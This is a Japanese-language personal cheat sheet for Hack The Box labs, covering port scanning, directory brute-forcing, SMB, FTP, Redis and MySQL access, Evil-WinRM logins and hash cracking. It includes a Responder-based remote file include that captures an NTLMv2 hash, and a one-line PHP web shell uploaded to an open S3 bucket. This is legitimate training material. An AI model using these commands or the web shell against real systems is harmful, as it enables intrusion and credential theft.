# Hack The Box メモ

# 目次

- [Hack The Box メモ](#hack-the-box-メモ)
- [目次](#目次)
- [ジャンル](#ジャンル)
  - [スキャン](#スキャン)
  - [リモートログイン](#リモートログイン)
  - [ファイル共有](#ファイル共有)
  - [Web](#web)
  - [Database](#database)
- [ツール](#ツール)
  - [nmap](#nmap)
  - [telnet](#telnet)
  - [ftp](#ftp)
  - [redis-cli](#redis-cli)
  - [smbclient](#smbclient)
  - [gobuster](#gobuster)
    - [SecList](#seclist)
  - [Evil-WinRM](#evil-winrm)
  - [John The Ripper](#john-the-ripper)
  - [Responder](#responder)
  - [AWS CLI](#aws-cli)
    - [s3](#s3)
- [テンプレート](#テンプレート)
  - [SQL Injection](#sql-injection)
  - [MySQL](#mysql)
- [ポート番号](#ポート番号)
  - [ウェルノウン](#ウェルノウン)
  - [それ以外](#それ以外)

# ジャンル

## スキャン

- ポートスキャン
  - 空いているポートを確認する
  - [nmap](#nmap)
- ハッシュ値解析
  - [John The Ripper](#john-the-ripper)

## リモートログイン

- telnet
  - ポート番号 23
  - 以下のような重要なアカウントで空白がパスワードになっていることがある
      - root
      - admin
      - administrator
  - [telnet](#telnet)
- Evil-WinRM
  - Windowsサーバにログインするツール
  - ポート番号 5985 Microsoft HTTPAPI httpdが使われていたら使えるかも
  - [Evil-WinRM](#evil-winrm)

## ファイル共有

- ftp
  - ポート番号 21
  - 匿名(anonymous)でログインできることがある
  - ログイン成功するとステータスコード230が返ってくる
  - [ftp](#ftp)
- smb
  - Windows標準の通信規約 ファイル共有やプリンタ共有
  - ポート番号: 445
  - [smbclient](#smbclient)
- s3
  - amazon s3
  - クラウドストレージ
  - [s3](#s3)

## Web

- gobuster
  - ウェブのディレクトリやファイルを見つけるためにブルートフォースアタック
  - サブドメイン探し
  - ファジング
  - [gobuster](#gobuster)
- responder
  - RFI(Remote File Include)攻撃
  - NTLM認証(チャレンジ/レスポンスメカニズム)を使っているときに使用
  - ハッシュ値を取得してJohn The Ripperで解析する
  - [Responder](#responder)

## Database

- SQL Injection
  - [SQL Injection テンプレート](#sql-injection)
- redis
  - データベース
  - ポート番号 6379
  - [redis-cli](#redis-cli)

# ツール

## nmap

```bash
nmap -p- --min-rate 10000 <IP address>

# -sV: Probe open ports to determine service/version info
# -p <小さい方の数字>-<大きい方の数字> ←で範囲指定
# -sC: 説明表示
```

## telnet

```bash
telnet <hostname>
```

## ftp

```bash
ftp <ip adress>
```

## redis-cli

```bash

# install
sudo apt install redis

# ログイン
redis-cli -h <ip address>

# サーバの情報や統計を取得
info

# データベースを指定(デフォルトが0)
select 0

# DB内のキーの数を取得
dbsize

# すべてのキーを取得
keys *

# 指定したキーの値を取得
get <key>
```

## smbclient

```bash
smbclient -L <ip address>

smbclient \\\\<ip address>\\<Shared Folder>
```

[日本語doc(非公式？)](https://www.samba.gr.jp/project/translation/3.6/htmldocs/manpages-3/smbclient.1.html)

## gobuster

```bash
gobuster dir -w <passwordlist path> -u <url>
```

ログインページさがし
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/Logins.fuzz.txt -u <hostname> -x php

# -xは拡張子指定
```

サブドメインさがし

```bash
gobuster vhost --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<ドメイン>
```

### SecList

パスワードリスト

[SecLists Github](https://github.com/danielmiessler/SecLists)

```bash
sudo apt install seclists
```

インストール後``/usr/share/seclists``ディレクトリにパスワードのリストが保管される

## Evil-WinRM

[Evil-WinRM Github](https://github.com/Hackplayers/evil-winrm)

This shell is the ultimate WinRM shell for hacking/pentesting.

```bash
evil-winrm -i <IPアドレス> -u <ユーザ名> -p <パスワード>
```

## John The Ripper

Responderで生成したハッシュ値をJohn The Ripperでクラック

```bash
sudo john -w=/usr/share/wordlists/rockyou.txt <ハッシュ値のファイルパス>
```

すでにクラック済みである場合は

```bash
sudo john --show <ハッシュ値のファイルパス>
```

## Responder

使い方

```
$ sudo responder -I tun0

-- 省略

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.37] //ここのIPアドレスを使ってRFIを行う
    Responder IPv6             [dead:beef:4::1023]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

-- 省略

[+] Listening for events...

```

攻撃したいサイトにリクエスト

```
http://<host name>/index.php?page=//<Reponder IP>/whatever
```

するとターミナル上で以下の表示がでる

```
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.160.239
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:e31b0661886ee2fe:A57075CC145AD0B4DBF2DC799B36D567:01010000000000000027AB2E9BE1DA01D433F70BDD19F0FB0000000002000800420037004A00480001001E00570049004E002D00510053005A004E0043005A003200420049003100330004003400570049004E002D00510053005A004E0043005A00320042004900310033002E00420037004A0048002E004C004F00430041004C0003001400420037004A0048002E004C004F00430041004C0005001400420037004A0048002E004C004F00430041004C00070008000027AB2E9BE1DA01060004000200000008003000300000000000000001000000002000003D21F00C78CFB8C1C6B784468A283FCCBE695909EFB158145D88A6A7819BDAF90A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330037000000000000000000

```

Administratorのハッシュ値をjohn the ripperにかける

Hash値は以下のフォルダに保存してある

```
/usr/share/responder/logs/SMB-NTLMv2-SSP-10.129.53.222.txt
```

## AWS CLI

設定
```bash
aws configure
```

### s3

s3内のフォルダリスト表示 多分ルート？

```bash
└──╼ $aws --endpoint=http://<ドメイン名> s3 ls
2024-07-31 00:30:50 thetoppers.htb
```

thetoppers.htbフォルダの中のリスト表示

```bash
└──╼ $aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2024-07-31 00:30:50          0 .htaccess
2024-07-31 00:30:50      11952 index.php
```

上記がWebページに表示しているフォルダが入っていることがわかる

OSコマンドを実行できるようなphpファイルを用意し、s3にアップロードする

自由にコマンドが実行できるようになる``http://thetoppers.htb/shell.php?cmd=<コマンド>``

```bash
└──╼ $echo '<?php system($_GET["cmd"]); ?>' > shell.php

└──╼ $aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
upload: ./shell.php to s3://thetoppers.htb/shell.php     
```

# テンプレート

## SQL Injection

- MySQL
  - \#を使ってコメントアウトする

## MySQL

- ポート 3306
- コマンド

```bash
mysql -h <hostname> -u root
```

```sql
show databases;

use htb;

show tables;

select * from config;
```

- mysql内でバージョンを確認

```sql
select version();
```


# ポート番号

## ウェルノウン

|番号|プロトコル|
|-|-|
|21|FTP|
|23|telnet|
|80|HTTP|
|443|HTTPS|
|445|SMB|

## それ以外

|番号|プロトコル|
|-|-|
|3306|MySQL|
|5985|Microsoft HTTPAPI httpd|
|6379|Redis|
